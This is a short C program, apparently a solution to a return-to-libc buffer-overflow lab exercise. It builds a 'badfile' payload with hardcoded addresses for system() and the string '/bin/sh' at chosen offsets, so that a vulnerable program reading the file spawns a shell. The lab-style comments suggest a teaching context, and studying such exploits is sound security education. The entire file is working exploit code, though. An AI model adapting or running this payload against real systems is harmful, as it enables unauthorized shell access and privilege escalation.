/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
char buf[40];
FILE *badfile;
badfile = fopen("./badfile", "w");
/* You need to decide the addresses and
the values for X, Y, Z. The order of the following
three statements does not imply the order of X, Y, Z.
Actually, we intentionally scrambled the order. */
*(long *) &buf[32] = 0xbffffdd6 ; // "/bin/sh"
*(long *) &buf[24] = 0xb7e42da0 ; // system()
//*(long *) &buf[28] = 0xb7e369d0 ; // exit()
fwrite(buf, sizeof(buf), 1, badfile);
fclose(badfile);
}
